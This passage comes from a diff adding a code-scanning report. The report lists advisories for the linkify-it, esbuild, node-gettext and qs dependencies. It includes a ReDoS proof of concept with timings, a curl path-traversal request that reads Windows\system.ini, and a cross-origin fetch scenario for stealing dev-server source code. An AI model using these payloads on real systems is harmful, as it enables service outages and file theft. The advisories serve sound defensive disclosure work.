\u0026\u0026 cd /tmp/linkifyit-redos\nnpm install linkify-it@5.0.0\ncat \u003e poc.mjs \u003c\u003c'EOF'\nimport LinkifyIt from 'linkify-it'\nconst l = new LinkifyIt()\nfor (const n of [1000, 2000, 4000, 8000, 16000]) {\nconst evil = 'a@b.com\\n'.repeat(n)\nconst t0 = process.hrtime.bigint()\nl.match(evil)\nconst ms = Number(process.hrtime.bigint() - t0) / 1e6\nconsole.log(n=${n} bytes=${evil.length} took ${ms.toFixed(0)} ms)\n}\nEOF\nnode poc.mjs\nMeasured output (Node v25.5.0, Apple Silicon)\nn=1000  bytes=8000    took 44 ms\nn=2000  bytes=16000   took 159 ms\nn=4000  bytes=32000   took 628 ms\nn=8000  bytes=64000   took 2506 ms\nn=16000 bytes=128000  took 9948 ms\nDoubling N → ~4× wall-clock, consistent with O(N²).\nmarkdown-it transitive (independently confirmed)\nbash\nnpm install markdown-it@14.1.1\nnode -e \"\nconst md = require('markdown-it')({ linkify: true })\nfor (const n of [1000, 2000, 4000, 8000]) {\nconst evil = 'a@b.com '.repeat(n)\nconst t0 = process.hrtime.bigint()\nmd.render(evil)\nconst ms = Number(process.hrtime.bigint() - t0) / 1e6\nconsole.log('n=' + n + ' bytes=' + evil.length + ' md.render=' + ms.toFixed(0) + 'ms')\n}\n\"\n"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 662,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/662"
+                    },
+                    "rule": { "id": "yarn4::GHSA-22p9-wv53-3rq4", "index": 0 },
+                    "ruleId": "yarn4::GHSA-22p9-wv53-3rq4"
+                },
+                {
+                    "correlationGuid": "0a3a04f3-e87c-495b-b6e3-e08018928973",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-v245-v573-v5vm in linkify-it@2.2.0: linkify-it's schema-scan loop (.test() / .match(), the documented public API) invokes the mailto:\nseverity: high\naffected_components: linkify-it@2.2.0\naffected_component_paths: \naffected_names: linkify-it\naffected_versions: 2.2.0\nid: GHSA-v245-v573-v5vm\ndescription:\nlinkify-it's schema-scan loop (.test() / .match(), the documented public API) invokes the mailto:\nschema validator at **every** mailto: occurrence in the input text. For each occurrence the validator does\ntext.slice(pos) (an O(n) copy) and runs an email regex whose local-part class src_email_name greedily\nscans the **entire remaining tail** (O(n)) before failing. With N mailto: occurrences that is\n**N × O(n) = O(n²)**. Because linkify-it runs on arbitrary user text (markdown-it feeds it whole documents\nwhen linkify:true), an unauthenticated attacker can block the single-threaded event loop for many seconds\nwith a small input. No length bound (unlike an HTTP header).\nRoot cause — index.mjs + lib/re.mjs\njs\n// index.mjs (mailto validator) — runs at every \"mailto:\" hit\n'mailto:': { validate: function (text, pos, self) {\nconst tail = text.slice(pos)                                  // O(n) copy per hit\nif (!self.re.mailto) self.re.mailto = new RegExp('^' + self.re.src_email_name + '@' + self.re.src_host_strict, 'i')\nif (self.re.mailto.test(tail)) { ... }                        // scans the whole O(n) tail\nreturn 0\n}}\n// lib/re.mjs:91-93 — every char of \"mailto:\" (incl. ':','-',';') is in this class:\nre.src_email_name = '[\\\\-;:\u0026=\\\\+\\\\$,\\\\.a-zA-Z0-9_][\\\\-;:\u0026=\\\\+\\\\$,\\\\\"\\\\.a-zA-Z0-9_]*'\nThe while ((m = re.exec(text)) !== null) { …testSchemaAt… } scan loop calls the validator at each\nmailto: hit; src_email_name greedily consumes the whole tail (all chars are in its class) then fails for\nlack of @. http:/https: do NOT blow up — their validator requires the tail to start with //, failing\nin O(1) per hit.\nProof of Concept (confirmed, linkify-it 5.0.1, Node v24)\njs\nconst LinkifyIt = require('linkify-it');\nconst lf = new LinkifyIt();\nlf.match('mailto:'.repeat(48000));   // ~336 KB of \"mailto:mailto:…\" -\u003e seconds of blocked event loop\n| input (same bytes) | 56 KB | 112 KB | 224 KB | 336 KB |\n|---|---:|---:|---:|---:|\n| **mailto: contiguous** | 97 ms | 357 ms | 1438 ms | 3272 ms |\n| mailto: space-separated | 2 ms | 3 ms | 5 ms | 8 ms |\n| http:// contiguous | 12 ms | 17 ms | 33 ms | 49 ms |\n×~4 per 2× input ⇒ O(n²); equal-byte controls stay flat ⇒ algorithmic, not a GC/allocation artifact.\nReal-world via markdown-it 14.x ({linkify:true}), md.render('mailto:'.repeat(n)): 219 KB ≈ ~5 s.\n\u003cimg width=\"737\" height=\"161\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b5d390f3-68d0-4861-9c47-ad8aff0203d5\" /\u003e\nReachable on arbitrary user text via the documented .test()/.match() API and through markdown-it's\nlinkifier — comment systems, chat, forums, wikis, note apps that render user markdown with linkify enabled.\nA ~220 KB post hangs the event loop ~5 s; a few hundred KB → tens of seconds. Availability only.\nSuggested remediation\nBound the email local-part per RFC 5321 (≤64) so per-hit work is O(1), and avoid the full-tail slice:\njs\n// lib/re.mjs — cap the greedy run:\nre.src_email_name = '[\\\\-;:\u0026=\\\\+\\\\$,\\\\.a-zA-Z0-9_][\\\\-;:\u0026=\\\\+\\\\$,\\\\\"\\\\.a-zA-Z0-9_]{0,63}'\n// index.mjs — prefer a sticky regex anchored at pos over text.slice(pos).\nAffected / disclosure\nAll versions through 5.0.1 (latest); same code on master. cve-mcp/OSV report no known vulnerability for\nlinkify-it. Distinct from markdown-it's own *-run ReDoS (CVE-2026-2327, different package/path) and the\nrecent markdown-it DoS. Reported privately; happy to test a patch against the PoC.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 687,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/687"
+                    },
+                    "rule": { "id": "yarn4::GHSA-v245-v573-v5vm", "index": 19 },
+                    "ruleId": "yarn4::GHSA-v245-v573-v5vm"
+                },
+                {
+                    "correlationGuid": "e397da8c-d98d-4e77-a138-9185477ae327",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-g974-hxvm-x689 in node-gettext@2.1.0: All versions of the package node-gettext are vulnerable to Prototype Pollution via the addTranslations() function in gettext.js due to improper user input sanitization.\nseverity: high\naffected_components: node-gettext@2.1.0\naffected_component_paths: \naffected_names: node-gettext\naffected_versions: 2.1.0\nid: GHSA-g974-hxvm-x689\ndescription:\nAll versions of the package node-gettext are vulnerable to Prototype Pollution via the addTranslations() function in gettext.js due to improper user input sanitization.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 321,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/321"
+                    },
+                    "rule": { "id": "yarn4::GHSA-g974-hxvm-x689", "index": 11 },
+                    "ruleId": "yarn4::GHSA-g974-hxvm-x689"
+                },
+                {
+                    "correlationGuid": "b30426d9-2c4a-4db9-aab8-fb6526c19268",
+                    "level": "note",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-g7r4-m6w7-qqqr in esbuild@0.28.0: The development server contains a path traversal vulnerability on Windows when serving files from servedir.\nseverity: low\naffected_components: esbuild@0.28.0\naffected_component_paths: \naffected_names: esbuild\naffected_versions: 0.28.0\nid: GHSA-g7r4-m6w7-qqqr\ndescription:\nThe development server contains a path traversal vulnerability on Windows when serving files from servedir.\nDue to the use of path.Clean() (which only normalizes forward-slash / separators) instead of a Windows-aware path normalization function, it is possible to craft requests using backslashes (\\) that bypass the intended directory containment logic. An attacker can escape the configured servedir root and access arbitrary files on the filesystem.\nThis issue affects Windows environments only.\nThe request path is sanitized using:\ngo\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\nqueryPath := path.Clean(req.URL.Path)[1:]\nHowever:\n- path.Clean() is POSIX-style and only understands / (docs: https://pkg.go.dev/path#Clean)\n- On Windows, \\ is a valid path separator\n- path.Clean() does not treat \\ as a separator\nLater, the server constructs the absolute path:\ngo\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L221\nabsPath := h.fs.Join(h.servedir, queryPath)\nIf queryPath contains sequences such as:\n..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\npath.Clean() will not normalize them, but the Windows filesystem will interpret \\ as directory separators when resolving absPath.\nBecause the implementation does not verify that the final resolved path remains within servedir, it allows directory traversal outside the intended root directory.\nVulnerable Code\ngo\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\nqueryPath := path.Clean(req.URL.Path)[1:]\n....\n// Check for a file in the \"servedir\" directory\nif h.servedir != \"\" \u0026\u0026 kind != fs.FileEntry {\nabsPath := h.fs.Join(h.servedir, queryPath)\nif absDir := h.fs.Dir(absPath); absDir != absPath {\nif entries, err, _ := h.fs.ReadDirectory(absDir); err == nil {\nif entry, _ := entries.Get(h.fs.Base(absPath)); entry != nil \u0026\u0026 entry.Kind(h.fs) == fs.FileEntry {\n....\nSteps to reproduce\nnpm install --save-exact --save-dev esbuild\necho \"console.log(1)\" \u003e app.js\n.\\node_modules\\.bin\\esbuild --version\n0.27.3\n.\\node_modules\\.bin\\esbuild app.js --bundle --outdir=www --servedir=www --watch\ncurl -i --path-as-is \"http://localhost:8000/..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\"\n\u003ccontent of Windows\\system.ini\u003e\n- Arbitrary file read on Windows\n- Exposure of sensitive files\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 694,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/694"
+                    },
+                    "rule": { "id": "yarn4::GHSA-g7r4-m6w7-qqqr", "index": 10 },
+                    "ruleId": "yarn4::GHSA-g7r4-m6w7-qqqr"
+                },
+                {
+                    "correlationGuid": "a2f5bd72-17e5-4765-bcdf-895b1d620250",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-gv7w-rqvm-qjhr in esbuild@0.28.0: The esbuild Deno module (lib/deno/mod.ts) downloads native binary executables from an npm registry and writes them to disk with executable permissions (0o755) **without performing ...\nseverity: high\naffected_components: esbuild@0.28.0\naffected_component_paths: \naffected_names: esbuild\naffected_versions: 0.28.0\nid: GHSA-gv7w-rqvm-qjhr\ndescription:\nThe esbuild Deno module (lib/deno/mod.ts) downloads native binary executables from an npm registry and writes them to disk with executable permissions (0o755) **without performing any integrity verification** (e.g., SHA-256 hash check). The Node.js equivalent (lib/npm/node-install.ts) includes a robust binaryIntegrityCheck() function that verifies SHA-256 hashes against hardcoded expected values from package.json, but this protection was never implemented for the Deno distribution.\nWhen the NPM_CONFIG_REGISTRY environment variable is set, the Deno module constructs a download URL using this attacker-influenced value and fetches a native binary from it. Because no integrity check is performed, an attacker who can control this environment variable (common in CI/CD pipelines, shared development environments, or corporate networks with custom npm registries) can supply a malicious binary that will be downloaded, written to disk, and executed with the privileges of the Deno process, achieving full remote code execution.\n**Vulnerable code path** — lib/deno/mod.ts lines 62–82:\ntypescript\nasync function installFromNPM(name: string, subpath: string): Promise\u003cstring\u003e {\nconst { finalPath, finalDir } = getCachePath(name)\ntry { await Deno.stat(finalPath); return finalPath } catch (e) {}\nconst npmRegistry = Deno.env.get(\"NPM_CONFIG_REGISTRY\") || \"https://registry.npmjs.org\"  // line 70: attacker-controlled\nconst url = ${npmRegistry}/${name}/-/${name.replace(\"@esbuild/\", \"\")}-${version}.tgz     // line 71: URL uses attacker base\nconst buffer = await fetch(url).then(r =\u003e r.arrayBuffer())                                  // line 72: download\nconst executable = extractFileFromTarGzip(new Uint8Array(buffer), subpath)                   // line 73: extract\nawait Deno.mkdir(finalDir, { recursive: true, mode: 0o700 })\nawait Deno.writeFile(finalPath, executable, { mode: 0o755 })                                 // line 80: write + chmod\nreturn finalPath                                                                              // line 81: no hash check\n}\n**Missing protection** — The Node.js equivalent at lib/npm/node-install.ts lines 228–234:\ntypescript\nfunction binaryIntegrityCheck(pkg: string, subpath: string, bytes: Uint8Array): void {\nconst hash = crypto.createHash('sha256').update(bytes).digest('hex')\nconst key = ${pkg}/${subpath}\nconst expected = packageJSON['esbuild.binaryHashes'][key]\nif (!expected) throw new Error(Missing hash for \"${key}\")\nif (hash !== expected) throw new Error(...)\n}\nThis function is called in both the installUsingNPM() path (line 131) and the downloadDirectlyFromNPM() path (line 243), but **no equivalent exists in the Deno module**. Searching the entire git history confirms binaryIntegrityCheck, binaryHashes, sha256, and hash have never appeared in lib/deno/mod.ts.\n**Execution flow after download:** The binary returned by installFromNPM() is passed to spawn() at line 291 of the same file:\ntypescript\nconst child = spawn(binPath, { args: [--service=${version}], ... })\n**Attack vector:** The NPM_CONFIG_REGISTRY environment variable is a standard npm configuration variable widely used in enterprise CI/CD pipelines to point to internal artifact repositories (Artifactory, Nexus, Verdaccio, etc.). An attacker who can inject or modify this variable in a build environment (e.g., via CI config injection, shared environment, or compromised registry) can redirect the download to a server they control and serve a trojaned native binary.\n**Prerequisites:** Deno runtime, Node.js (for fake registry)\n**Step 1:** Create a fake npm registry that serves a malicious binary:\njavascript\n// fake-registry.js\nconst http = require('http');\nconst zlib = "
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 649,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/649"
+                    },
+                    "rule": { "id": "yarn4::GHSA-gv7w-rqvm-qjhr", "index": 12 },
+                    "ruleId": "yarn4::GHSA-gv7w-rqvm-qjhr"
+                },
+                {
+                    "correlationGuid": "2ade2137-8650-46fe-8d10-afbd769170d3",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-q8mj-m7cp-5q26 in qs@6.14.2: qs.stringify throws TypeError when called with arrayFormat: 'comma' and encodeValuesOnly: true on an array containing null or undefined. The throw is synchronous and not handled by...\nseverity: medium\naffected_components: qs@6.14.2\naffected_component_paths: \naffected_names: qs\naffected_versions: 6.14.2\nid: GHSA-q8mj-m7cp-5q26\ndescription:\nqs.stringify throws TypeError when called with arrayFormat: 'comma' and encodeValuesOnly: true on an array containing null or undefined. The throw is synchronous and not handled by any of qs's null-related options (skipNulls, strictNullHandling).\nIn the comma + encodeValuesOnly branch, lib/stringify.js:145 mapped the array through the raw encoder before joining:\njs\nobj = utils.maybeMap(obj, encoder);\nutils.encode (lib/utils.js:195) reads str.length with no null guard, so a null or undefined element throws TypeError. skipNulls and strictNullHandling are both checked in the per-element loop below this line and never get a chance to run.\nSame class of bug as the filter-array path fixed in 0c180a4. The vulnerable shape of the comma + encodeValuesOnly branch was introduced in 4c4b23d (\"encode comma values more consistently\", PR #463, 2023-01-19), first released in v6.11.1.\njs\nconst qs = require('qs');\nqs.stringify({ a: [null, 'b'] },      { arrayFormat: 'comma', encodeValuesOnly: true });\nqs.stringify({ a: [undefined, 'b'] }, { arrayFormat: 'comma', encodeValuesOnly: true });\nqs.stringify({ a: [null] },           { arrayFormat: 'comma', encodeValuesOnly: true });\n// TypeError: Cannot read properties of null (reading 'length')\n//     at encode (lib/utils.js:195:13)\n//     at Object.maybeMap (lib/utils.js:322:37)\n//     at stringify (lib/stringify.js:145:25)\nFix\nlib/stringify.js:145, applied in 21f80b3 on main:\ndiff\n- obj = utils.maybeMap(obj, encoder);\n+ obj = utils.maybeMap(obj, function (v) {\n+     return v == null ? v : encoder(v);\n+ });\nnull and undefined now pass through maybeMap unchanged and reach the join(',') step as-is. For { a: [null, 'b'] } this produces a=,b, matching the non-encodeValuesOnly comma path (which already joins before encoding and produces a=%2Cb for the same input). Single-element [null] arrays still collapse via the existing obj.join(',') || null and remain subject to skipNulls / strictNullHandling in the main loop.\nAffected versions\n\u003e=6.11.1 \u003c=6.15.1\nThe vulnerable code shape was introduced in 4c4b23d and first shipped in v6.11.1. Earlier versions — including all of 6.7.x, 6.8.x, 6.9.x, 6.10.x, and 6.11.0 — implemented the comma + encodeValuesOnly path differently (joining before encoding) and are not affected. Empirically verified across released versions.\nApplication code that calls qs.stringify with both arrayFormat: 'comma' and encodeValuesOnly: true (both non-default) on input that may contain a null or undefined array element will throw synchronously instead of producing a query string. In a typical Node.js HTTP framework (Express, Fastify, Koa, hapi) the sync throw is caught by the framework's error boundary and the affected request returns a 500; the worker process does not exit and subsequent requests are unaffected. The \"kills the worker process\" framing applies only to call sites outside a request-handler error boundary (background jobs, startup paths, stream pipelines) or to deployments with framework error handling explicitly disabled.\nThe vulnerable input is a null or undefined entry inside an array; this is reachable from JSON request bodies or from application code constructing arrays from user input, but not from standard HTML form submissions (which produce strings or omitted fields, not literal null).\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 381,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/381"
+                    },
+                    "rule": { "id": "yarn4::GHSA-q8mj-m7cp-5q26", "index": 18 },
+                    "ruleId": "yarn4::GHSA-q8mj-m7cp-5q26"
+                },
+                {
+                    "correlationGuid": "cda0af76-93a4-49e6-a2af-eac30e3806d6",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-67mh-4wv8-2f99 in esbuild@0.18.20: esbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\nseverity: medium\naffected_components: esbuild@0.18.20\naffected_component_paths: \naffected_names: esbuild\naffected_versions: 0.18.20\nid: GHSA-67mh-4wv8-2f99\ndescription:\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\nesbuild sets Access-Control-Allow-Origin: * header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n**Attack scenario**:\n1. The attacker serves a malicious web page (http://malicious.example.com).\n1. The user accesses the malicious web page.\n1. The attacker sends a fetch('http://127.0.0.1:8000/main.js') request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of http://127.0.0.1:8000/main.js.\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n- Fetching /index.html: normally you have a script tag here\n- Fetching /assets: it's common to have a assets directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting /esbuild SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (new EventSource('/esbuild').addEventListener('change', e =\u003e console.log(e.type, e.data)))\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n1. Download reproduction.zip (https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run npm i\n1. Run npm run watch\n1. Run fetch('http://127.0.0.1:8000/app.js').then(r =\u003e r.text()).then(content =\u003e console.log(content)) in a different website's dev tools.\n!image (https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\nUsers using the serve feature may get the source code stolen by malicious websites.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 338,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/338"
+                    },
+                    "rule": { "id": "yarn4::GHSA-67mh-4wv8-2f99", "index": 3 },
+                    "ruleId": "yarn4::GHSA-67mh-4wv8-2f99"
+                },
+                {
+                    "correlationGuid": "e67eab43-f9b0-4ab2-87de-fd537ff9f9a5",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-gv7w-rqvm-qjhr in esbuild@0.18.20: The esbuild Deno module (lib/deno/mod.ts) downloads native binary executables from an npm registry and writes them to disk with executable permissions (0o755) **without performing ...\nseverity: high\naffected_components: esbuild@0.18.20\naffected_component_paths: \naffected_names: esbuild\naffected_versions: 0.18.20\nid: GHSA-gv7w-rqvm-qjhr\ndescription:\nThe esbuild Deno module (lib/deno/mod.ts) downloads native binary executables from an npm registry and writes them to disk with executable permissions (0o755) **without performing any integrity verification** (e.g., SHA-256 hash check). The Node.js equivalent (lib/npm/node-install.ts) includes a robust binaryIntegrityCheck() function that verifies SHA-256 hashes against hardcoded expected values from package.json, but this protection was never implemented for the Deno distribution.\nWhen the NPM_CONFIG_REGISTRY environment variable is set, the Deno module constructs a download URL using this attacker-influenced value and fetches a native binary from it. Because no integrity check is performed, an attacker who can control this environment variable (common in CI/CD pipelines, shared development environments, or corporate networks with custom npm registries) can supply a malicious binary that will be downloaded, written to disk, and executed with the privileges of the Deno process, achieving full remote code execution.\n**Vulnerable code path** — lib/deno/mod.ts lines 62–82:\ntypescript\nasync function installFromNPM(name: string, subpath: string): Promise\u003cstring\u003e {\nconst { finalPath, finalDir } = getCachePath(name)\ntry { await Deno.stat(finalPath); return finalPath } catch (e) {}\nconst npmRegistry = Deno.env.get(\"NPM_CONFIG_REGISTRY\") || \"https://registry.npmjs.org\"  // line 70: attacker-controlled\nconst url = ${npmRegistry}/${name}/-/${name.replace(\"@esbuild/\", \"\")}-${version}.tgz     // line 71: URL uses attacker base\nconst buffer = await fetch(url).then(r =\u003e r.arrayBuffer())                                  // line 72: download\nconst executable = extractFileFromTarGzip(new Uint8Array(buffer), subpath)                   // line 73: extract\nawait Deno.mkdir(finalDir, { recursive: true, mode: 0o700 })\nawait Deno.writeFile(finalPath, executable, { mode: 0o755 })                                 // line 80: write + chmod\nreturn finalPath                                                                              // line 81: no hash check\n}\n**Missing protection** — The Node.js equivalent at lib/npm/node-install.ts lines 228–234:\ntypescript\nfunction binaryIntegrityCheck(pkg: string, subpath: string, bytes: Uint8Array): void {\nconst hash = crypto.createHash('sha256').update(bytes).digest('hex')\nconst key = ${pkg}/${subpath}\nconst expected = packageJSON['esbuild.binaryHashes'][key]\nif (!expected) throw new Error(Missing hash for \"${key}\")\nif (hash !== expected) throw new Error(...)\n}\nThis function is called in both the installUsingNPM() path (line 131) and the downloadDirectlyFromNPM() path (line 243), but **no equivalent exists in the Deno module**. Searching the entire git history confirms binaryIntegrityCheck, binaryHashes, sha256, and hash have never appeared in lib/deno/mod.ts.\n**Execution flow after download:** The binary returned by installFromNPM() is passed to spawn() at line 291 of the same file:\ntypescript\nconst child = spawn(binPath, { args: [--service=${version}], ... })\n**Attack vector:** The NPM_CONFIG_REGISTRY environment variable is a standard npm configuration variable widely used in enterprise CI/CD pipelines to point to internal artifact repositories (Artifactory, Nexus, Verdaccio, etc.). An attacker who can inject or modify this variable in a build environment (e.g., via CI config injection, shared environment, or compromised registry) can redirect the download to a server they control and serve a trojaned native binary.\n**Prerequisites:** Deno runtime, Node.js (for fake registry)\n**Step 1:** Create a fake npm registry that serves a malicious binary:\njavascript\n// fake-registry.js\nconst http = require('http');\nconst zlib"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 650,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/650"
+                    },
+                    "rule": { "id": "yarn4::GHSA-gv7w-rqvm-qjhr", "index": 12 },
+                    "ruleId": "yarn4::GHSA-gv7w-rqvm-qjhr"
+                },
+                {
+                    "correlationGuid": "bf382002-84d7-44ab-8da1-4e940f6eb7ba",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-67mh-4wv8-2f99 in esbuild@0.21.5: esbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\nseverity: medium\naffected_components: esbuild@0.21.5\naffected_component_paths: \naffected_names: esbuild\naffected_versions: 0.21.5\nid: GHSA-67mh-4wv8-2f99\ndescription:\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\nesbuild sets Access-Control-Allow-Origin: * header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n**Attack scenario**:\n1. The attacker serves a malicious web page (http://malicious.example.com).\n1. The user accesses the malicious web page.\n1. The attacker sends a fetch('http://127.0.0.1:8000/main.js') request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of http://127.0.0.1:8000/main.js.\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n- Fetching /index.html: normally you have a script tag here\n- Fetching /assets: it's common to have a assets directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting /esbuild SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (new EventSource('/esbuild').addEventListener('change', e =\u003e console.log(e.type, e.data)))\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n1. Download reproduction.zip (https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run npm i\n1. Run npm run watch\n1. Run fetch('http://127.0.0.1:8000/app.js').then(r =\u003e r.text()).then(content =\u003e console.log(content)) in a different website's dev tools.\n!image (https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\nUsers using the serve feature may get the source code stolen by malicious websites.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 732,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/732"
+                    },
+                    "rule": { "id": "yarn4::GHSA-67mh-4wv8-2f99", "index": 3 },
+                    "ruleId": "yarn4::GHSA-67mh-4wv8-2f99"
+                },
+                {
+                    "correlationGuid": "9d1869a2-4fd1-4880-961f-aa43896de6c9",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-gv7w-rqvm-qjhr in esbuild@0.21.5: The esbuild Deno module (lib/deno/mod.ts) downloads native binary executables from an npm registry and writes them to disk with executable permissions (0o755) **without performing ...\nseverity: high\naffected_components: esbuild@0.21.5\naffected_component_paths: \naffected_names: esbuild\naffected_versions: 0.21.5\nid: GHSA-gv7w-rqvm-qjhr\ndescription:\nThe esbuild Deno module (lib/deno/mod.ts) downloads native binary executables from an npm registry and writes them to disk with executable permissions (0o755) **without performing any integrity verification** (e.g., SHA-256 hash check). The Node.js equivalent (lib/npm/node-install.ts) includes a robust binaryIntegrityCheck() function that verifies SHA-256 hashes against hardcoded expected values from package.json, but this protection was never implemented for the Deno distribution.\nWhen the NPM_CONFIG_REGISTRY environment variable is set, the Deno module constructs a download URL using this attacker-influenced value and fetches a native binary from it. Because no integrity check is performed, an attacker who can control this environment variable (common in CI/CD pipelines, shared development environments, or corporate networks with custom npm registries) can supply a malicious binary that will be downloaded, written to disk, and executed with the privileges of the Deno process, achieving full remote code execution.\n**Vulnerable code path** — lib/deno/mod.ts lines 62–82:\ntypescript\nasync function installFromNPM(name: string, subpath: string): Promise\u003cstring\u003e {\nconst { finalPath, finalDir } = getCachePath(name)\ntry { await Deno.stat(finalPath); return finalPath } catch (e) {}\nconst npmRegistry = Deno.env.get(\"NPM_CONFIG_REGISTRY\") || 